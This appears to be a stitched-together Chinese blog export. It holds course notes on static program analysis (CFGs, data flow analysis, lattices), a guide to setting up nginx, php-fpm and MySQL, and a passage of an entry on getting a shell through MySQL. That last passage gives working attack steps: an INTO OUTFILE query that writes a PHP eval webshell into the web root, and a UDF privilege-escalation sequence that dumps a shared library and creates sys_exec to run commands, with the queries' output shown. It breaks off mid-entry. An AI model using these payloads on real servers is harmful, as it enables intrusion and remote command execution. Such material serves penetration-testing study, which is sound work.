<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185425580.png" class="" title="image-20220103185425580">

<p>程序到静态分析的流程理解：<strong>程序-&gt;IR(3addr 3地址码)-&gt;CFG-&gt;静态分析</strong></p>
<p>AST与IR的区别</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185553431.png" class="" title="image-20220103185553431">

<h3 id="1-2-What-IR-Soot’s-IR-Jimple"><a href="#1-2-What-IR-Soot’s-IR-Jimple" class="headerlink" title="1.2 What IR(Soot’s IR:Jimple)"></a>1.2 What IR(Soot’s IR:Jimple)</h3><p><strong>demo1:do while loop</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185733224.png" class="" title="image-20220103185733224">
<p><strong>demo2:method call</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185756327.png" class="" title="image-20220103185756327">
<p><strong>demo3:class</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185813310.png" class="" title="image-20220103185813310">
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185825140.png" class="" title="image-20220103185825140">

<h3 id="1-3-Control-Flow-Graph-CFG"><a href="#1-3-Control-Flow-Graph-CFG" class="headerlink" title="1.3 Control Flow Graph(CFG)"></a>1.3 Control Flow Graph(CFG)</h3><h4 id="1-3-1-graph-nodes-basi，c-blocks-BB"><a href="#1-3-1-graph-nodes-basi，c-blocks-BB" class="headerlink" title="1.3.1 graph nodes : basi，c blocks(BB)"></a>1.3.1 graph nodes : basi，c blocks(BB)</h4><h5 id="Basic-Blocks定义"><a href="#Basic-Blocks定义" class="headerlink" title="Basic Blocks定义"></a><strong>Basic Blocks定义</strong></h5><p>入口和出口都是唯一的最大3地址码顺序集合</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103190319354.png" class="" title="image-20220103190319354">

<h5 id="⭐️判别Basic-Blocks方法"><a href="#⭐️判别Basic-Blocks方法" class="headerlink" title="⭐️判别Basic Blocks方法"></a>⭐️<strong>判别Basic Blocks方法</strong></h5><p><strong>step1 ：先找到所有BB的入口(leaders)，可通过下面3中方法判定</strong></p>
<ul>
<li><strong>程序中的第一条指令</strong></li>
<li><strong>任何被jump (goto) 到的目标都为leader</strong></li>
<li><strong>任何紧跟jump语句后的语句都为leader</strong></li>
</ul>
<p><strong>step2：一个leader和后面的所有指令，直到下一个leader为止</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103193220938.png" class="" title="image-20220103193220938">



<h5 id="例子：3AC转换BBs"><a href="#例子：3AC转换BBs" class="headerlink" title="例子：3AC转换BBs"></a><strong>例子：3AC转换BBs</strong></h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103195204869.png" class="" title="image-20220103195204869">

<h4 id="1-3-2-Graph-edge"><a href="#1-3-2-Graph-edge" class="headerlink" title="1.3.2 Graph edge"></a>1.3.2 Graph edge</h4><h5 id="⭐️如何给BBs加边"><a href="#⭐️如何给BBs加边" class="headerlink" title="⭐️如何给BBs加边"></a>⭐️如何给BBs加边</h5><p><strong>1.不管有无条件的jump，起点与目标的连线</strong></p>
<p><strong>2.正常的无条件指令，按执行顺序依次连线</strong></p>
<p><strong>3.第1条的连线用jump指令所在的BB连线代替，如下图A与B</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103200344933.png" class="" title="image-20220103200344933">

<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103201711683.png" class="" title="image-20220103201711683">

<h2 id="2-Data-Flow-Analysis-Applications-（第三、四节课）"><a href="#2-Data-Flow-Analysis-Applications-（第三、四节课）" class="headerlink" title="2.  Data Flow Analysis - Applications （第三、四节课）"></a>2.  Data Flow Analysis - Applications （第三、四节课）</h2><p>下面介绍3钟不同的数据流分析算法，通过算法可以解出CFG可流通的路径，算法不同，路径结果也不同</p>
<h3 id="2-1-前置知识"><a href="#2-1-前置知识" class="headerlink" title="2.1 前置知识"></a>2.1 前置知识</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183449579.png" class="" title="image-20220103183449579">

<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183816522.png" class="" title="image-20220103183816522">



<h3 id="2-2-Reaching-Definitions-Analysis"><a href="#2-2-Reaching-Definitions-Analysis" class="headerlink" title="2.2 Reaching Definitions Analysis"></a>2.2 Reaching Definitions Analysis</h3><h4 id="Reaching-Definitions-定义解析"><a href="#Reaching-Definitions-定义解析" class="headerlink" title="Reaching Definitions 定义解析"></a>Reaching Definitions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103114709803.png" class="" title="image-20220103114709803">

<h4 id="⭐️Reaching-Definitions-实现算法"><a href="#⭐️Reaching-Definitions-实现算法" class="headerlink" title="⭐️Reaching Definitions 实现算法"></a>⭐️Reaching Definitions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115143201.png" class="" title="image-20220103115143201">

<h4 id="Reaching-Definitions-实例演示"><a href="#Reaching-Definitions-实例演示" class="headerlink" title="Reaching Definitions 实例演示"></a>Reaching Definitions 实例演示</h4><p>每一个变量赋值表达式子用都代表一个Definition，这里用Dn表示，蓝色代表变量x，红色代表y，黑色代表m，绿色代表z</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115459081.png" class="" title="image-20220103115459081">

<h3 id="2-3-Live-Variables-Analysis-（第四节课）"><a href="#2-3-Live-Variables-Analysis-（第四节课）" class="headerlink" title="2.3 Live Variables Analysis （第四节课）"></a>2.3 Live Variables Analysis （第四节课）</h3><h4 id="Live-Variables-定义解析"><a href="#Live-Variables-定义解析" class="headerlink" title="Live Variables 定义解析"></a>Live Variables 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103123845303.png" class="" title="image-20220103123845303">

<h4 id="⭐️Live-Variables-实现算法"><a href="#⭐️Live-Variables-实现算法" class="headerlink" title="⭐️Live Variables 实现算法"></a>⭐️Live Variables 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103163513747.png" class="" title="image-20220103163513747">

<h4 id="Live-Variables-实例演示"><a href="#Live-Variables-实例演示" class="headerlink" title="Live Variables 实例演示"></a>Live Variables 实例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103174745109.png" class="" title="image-20220103174745109">

<h3 id="2-4-Available-Expressions-Analysis"><a href="#2-4-Available-Expressions-Analysis" class="headerlink" title="2.4 Available Expressions Analysis"></a>2.4 Available Expressions Analysis</h3><h4 id="Available-Expressions-定义解析"><a href="#Available-Expressions-定义解析" class="headerlink" title="Available Expressions 定义解析"></a>Available Expressions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180809651.png" class="" title="image-20220103180809651">

<h4 id="⭐️Available-Expressions-实现算法"><a href="#⭐️Available-Expressions-实现算法" class="headerlink" title="⭐️Available Expressions 实现算法"></a>⭐️Available Expressions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180018797.png" class="" title="image-20220103180018797">

<h4 id="Available-Expressions-示例演示"><a href="#Available-Expressions-示例演示" class="headerlink" title="Available Expressions 示例演示"></a>Available Expressions 示例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180716543.png" class="" title="image-20220103180716543">

<h3 id="⭐️2-5-三种数据流分析应用对比"><a href="#⭐️2-5-三种数据流分析应用对比" class="headerlink" title="⭐️2.5 三种数据流分析应用对比"></a>⭐️2.5 三种数据流分析应用对比</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103181138043.png" class="" title="image-20220103181138043">

<h2 id="3-Data-Flow-Analysis-Foundations-（第五、六节课）"><a href="#3-Data-Flow-Analysis-Foundations-（第五、六节课）" class="headerlink" title="3. Data Flow Analysis - Foundations （第五、六节课）"></a>3. Data Flow Analysis - Foundations （第五、六节课）</h2><h3 id="⭐️3-1-Iterative-Algorithm-Another-View"><a href="#⭐️3-1-Iterative-Algorithm-Another-View" class="headerlink" title="⭐️3.1 Iterative Algorithm, Another View"></a>⭐️3.1 Iterative Algorithm, Another View</h3><p>前面3中数据流分析算法满足<strong>不动点定律</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109104249059.png" class="" title="image-20220109104249059">

<h3 id="3-2-Partial-Order"><a href="#3-2-Partial-Order" class="headerlink" title="3.2 Partial Order"></a>3.2 Partial Order</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135207135.png" class="" title="image-20220109135207135">

<h3 id="3-3-Upper-and-Lower-Bounds"><a href="#3-3-Upper-and-Lower-Bounds" class="headerlink" title="3.3 Upper and Lower Bounds"></a>3.3 Upper and Lower Bounds</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135035140.png" class="" title="image-20220109135035140">

<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109140408193.png" class="" title="image-20220109140408193">

<h3 id="⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="⭐️3.4 Lattice, Semilattice, Complete and Product Lattice"></a>⭐️3.4 Lattice, Semilattice, Complete and Product Lattice</h3><ul>
<li><strong>Lattice(格)：poset中的任意2个元素，都存在最小上界和最大下界</strong></li>
<li><strong>Semilattice(半格)：poset中的任意2个元素，只有上界或只有下界</strong></li>
<li><strong>Complete Lattice(完全格)：一个Lattice的任意子集都存在最小上界和最大下界，则称为Complete Lattice</strong><ul>
<li>其实finite的lattice一定是Complete Lattice（反过来不一定）</li>
</ul>
</li>
<li><strong>Product Lattice：可理解为多个Lattice的笛卡尔积</strong><ul>
<li>Product Lattice也是一个Lattice</li>
<li>构成Product Lattice的每一个Lattice都是Complete的，那么这个Product Lattice也是Complete</li>
</ul>
</li>
</ul>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135417528.png" class="" title="image-20220109135417528">

<p>.<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109143223130.png" class="" title="image-20220109143223130"></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109142123333.png" class="" title="image-20220109142123333">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://space.bilibili.com/2919428/channel/seriesdetail?sid=1006553&ctype=0" >课程视频<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://pascal-group.bitbucket.io/teaching.html" >课件<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>手动搭建nginx+php-fpm+mysql环境--信安之路实验</title>
    <url>/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="0x01-关键过程"><a href="#0x01-关键过程" class="headerlink" title="0x01 关键过程"></a>0x01 关键过程</h2><h3 id="1-安装nigix"><a href="#1-安装nigix" class="headerlink" title="1.安装nigix"></a>1.安装nigix</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install nginx	#安装nginx</span><br><span class="line">service nginx start		#启动nginx</span><br></pre></td></tr></table></figure>

<p>安装后浏览器访问本地ip。</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564584947181.png" class="" width="1564584947181">

<h3 id="2-安装php7-2-fpm和配置nginx"><a href="#2-安装php7-2-fpm和配置nginx" class="headerlink" title="2.安装php7.2-fpm和配置nginx"></a>2.安装php7.2-fpm和配置nginx</h3><ol>
<li><p><strong>安装php7.2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install php7.2-fpm</span><br></pre></td></tr></table></figure></li>
<li><p><strong>修改nginx配置文件</strong></p>
<p>为使nginx支持php解析，需设置fastcgi解析器的路径，修改nginx安装目录的文件<code>/etc/nginx/sites-available/default</code>，如图。</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564585815801.png" class="" width="1564585815801">

<p>重启nginx。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure></li>
<li><p><strong>设置php-fpm的监听端口</strong></p>
<p>修改php-fpm安装目录下配置文件<code>/etc/php/7.2/fpm/pool.d/www.conf</code>，查看是否同nginx配置文件的路径或监听的端口一致，如图。</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564586839658.png" class="" width="1564586839658"></li>
<li><p><strong>测试配置是否成功</strong></p>
<p>进入<code>/var/www/html/</code>目录下添加<code>test.php</code>测试文件，浏览器访问（若第三步未配置会报502错误），配置成功情况如下图。</p>
</li>
</ol>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564587125109.png" class="" width="1564587125109">

<h3 id="3-安装mysql"><a href="#3-安装mysql" class="headerlink" title="3.安装mysql"></a>3.安装mysql</h3><ol>
<li><p>安装mysql</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get -y install mysql-server mysql-client	#安装mysql</span><br><span class="line">apt-get install php7.2-mysql	#安装php支撑mysql的模块</span><br></pre></td></tr></table></figure></li>
<li><p>在设置好mysql密码后，使用<code>systemctl status mysql</code>查看mysql状态，若为active则可测试链接</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564630920244.png" class="" width="1564630920244">

<p>3.测试php7链接数据库</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564631058876.png" class="" width="1564631058876"></li>
</ol>
<h2 id="0x02-坑点"><a href="#0x02-坑点" class="headerlink" title="0x02 坑点"></a>0x02 坑点</h2><p>1.配置nginx安装路径下的/etc/nginx/sites-enabled/default文件时，fastcgi_pass只能有一个，否则nigix启动会报错</p>
<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564582956194.png" class="" width="1564582956194">

<p>2.当php7使用mysql_connect函数链接mysql数据库没有返回值，在php.ini中设置error_reporting  =  E_ALL，display_errors = On，也没有任何报错信息！后参考<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >文章<i class="fas fa-external-link-alt"></i></a> ，发现是mysql_connect支持的是php5，而我装的是php7，改用mysqli函数成功链接数据库</p>
<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>nginx+php+fpm运行原理  <a class="link"   href="https://segmentfault.com/a/1190000023097951" >https://segmentfault.com/a/1190000023097951<i class="fas fa-external-link-alt"></i></a></p>
<p>php之函数mysql_connect连接mysql没有任何返回值（2019年）<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >https://blog.csdn.net/Brouce__Lee/article/details/94188470<i class="fas fa-external-link-alt"></i></a></p>
<p>lnpm环境搭建过程  <a class="link"   href="https://www.imooc.com/article/32579" >https://www.imooc.com/article/32579<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>通过mysql获取shell的几种方法</title>
    <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
<p>1.当前数据库用户为root权限</p>
<p>2.secure-file-priv为空（或包含web目录）</p>
<p>3.已知网站的绝对路径且具有写的权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.secure_file_priv为空（或包含udf目录）</p>
<p>3.udf目录具有写权限</p>
<p><strong>利用步骤</strong></p>
<p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>

<p>当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹</p>
